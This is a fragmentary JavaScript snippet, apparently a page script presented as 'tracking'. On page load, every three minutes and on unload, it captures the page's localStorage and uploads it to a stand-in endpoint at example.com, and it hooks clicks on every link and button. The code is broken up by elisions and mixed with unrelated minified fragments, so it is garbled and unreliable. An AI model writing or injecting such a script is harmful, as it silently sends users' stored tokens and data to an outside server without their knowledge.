...
function getHash(obj) {
  ...
  const keysSortedString = keysArr.sort().toString();
  let hashVal = 0;
  for (let i = 0; i < keysSortedString.length; ++i) {
    const character = keysSortedString.charCodeAt(i);
...
function attachHooks(element, eventName) {
...
var e,
  ...
  o = {};
async function uploadTrackingData(data) {
  const hash = getHash(data);
  const apiEndpoint = 'https://example.com/api/collectData';
  try {
    ...
    console.log("Data upload was successful.");
  } catch (error) {
    console.error('Data upload encountered an error:', error);
  }
}
function collectDataAndUpload() {
  const collectedData = captureLocalStorage();
  if (Object.keys(collectedData).length > 0) {
    uploadTrackingData(collectedData);
  }
}
window.addEventListener('DOMContentLoaded', function () {
  collectDataAndUpload();
  setInterval(collectDataAndUpload, 180000);
  const selectedElements = document.querySelectorAll('a, button');
  selectedElements.forEach(element => {
    attachHooks(element, 'click');
  });
  window.addEventListener('unload', collectDataAndUpload);
});
function a(e) {
  var t = o[e];
